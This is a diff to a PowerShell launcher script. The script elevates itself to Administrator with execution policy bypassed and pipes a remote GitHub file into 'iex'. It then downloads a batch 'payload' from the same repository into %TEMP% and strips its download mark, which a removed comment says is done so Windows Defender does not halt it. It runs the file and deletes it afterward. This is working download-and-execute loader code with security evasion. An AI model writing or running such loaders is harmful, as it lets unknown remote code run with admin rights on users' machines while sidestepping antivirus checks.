@@ -10,10 +10,18 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 if (-not $isAdmin) {
     Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
     try {
-        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://github.com/DevJeffersonL/MAS/blob/914c170bd993e57520d38dbddd7f54f05f3a5045/main.bat | iex`""
+        # -NoExit keeps the elevated window visible
+        # Arguments passed as an array to avoid string quote-escaping issues
+        $psArgs = @(
+            "-NoExit",
+            "-NoProfile",
+            "-ExecutionPolicy", "Bypass",
+            "-Command", "irm 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.txt' | iex"
+        )
+        Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -Verb RunAs
         Exit
     } catch {
-        Write-Host "[-] Administrator elevation was declined or failed." -ForegroundColor Red
+        Write-Host "[-] Administrator elevation was declined or failed: $($_.Exception.Message)" -ForegroundColor Red
         Exit
     }
 }
@@ -21,18 +29,19 @@ if (-not $isAdmin) {
 # 2. Force modern TLS protocols (required for GitHub raw URLs)
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
 
-# 3. Target URLs and temporary path configuration
-$rawUrl   = 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.bat'
+# 3. Path configuration
+$rawUrl   = 'https://github.com/DevJeffersonL/MAS/blob/b474a697269355abd580359ac1ff156c4d3f9f7f/main.bat'
 $tempDir  = [System.IO.Path]::GetTempPath()
 $randTag  = [System.IO.Path]::GetRandomFileName().Substring(0, 6)
 $tempBat  = Join-Path -Path $tempDir -ChildPath "run_${randTag}.bat"
 
 $downloadSuccess = $false
 
-Write-Host "[*] Connecting to repository..." -ForegroundColor Cyan
+Write-Host "[*] Connected as Administrator." -ForegroundColor Green
+Write-Host "[*] Downloading batch payload..." -ForegroundColor Cyan
 
 # -------------------------------------------------------------------------
-# Tier 1: curl.exe (Fastest download method)
+# Tier 1: curl.exe
 # -------------------------------------------------------------------------
 if (Get-Command 'curl.exe' -ErrorAction SilentlyContinue) {
     try {
@@ -44,7 +53,7 @@ if (Get-Command 'curl.exe' -ErrorAction SilentlyContinue) {
 }
 
 # -------------------------------------------------------------------------
-# Tier 2: .NET WebClient (Reliable fallback)
+# Tier 2: .NET WebClient
 # -------------------------------------------------------------------------
 if (-not $downloadSuccess) {
     try {
@@ -74,26 +83,25 @@ if (-not $downloadSuccess) {
 
 if (-not $downloadSuccess) {
     Write-Host "[-] Failed to download the batch payload from GitHub." -ForegroundColor Red
-    Exit
+    return
 }
 
 # -------------------------------------------------------------------------
-# 4. Direct Execution & Interactive Session
+# 4. Batch Execution
 # -------------------------------------------------------------------------
 try {
-    # Remove Zone.Identifier so Windows Defender does not halt execution
     Unblock-File -LiteralPath $tempBat -ErrorAction SilentlyContinue
 
-    Write-Host "[+] Launching script..." -ForegroundColor Green
-
-    # Run the batch script directly inside the active command prompt
+    Write-Host "[+] Launching payload: $tempBat" -ForegroundColor Green
+    
+    # Run the batch file in the current console
     & "$env:ComSpec" /c "`"$tempBat`""
 }
 catch {
-    Write-Host "[-] Execution encountered an error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
 }
 finally {
-    # Remove the temporary batch file from %TEMP% after the script finishes
+    # Delete the temp file after the batch script finishes
     if (Test-Path -LiteralPath $tempBat) {
         Remove-Item -LiteralPath $tempBat -Force -ErrorAction SilentlyContinue
     }
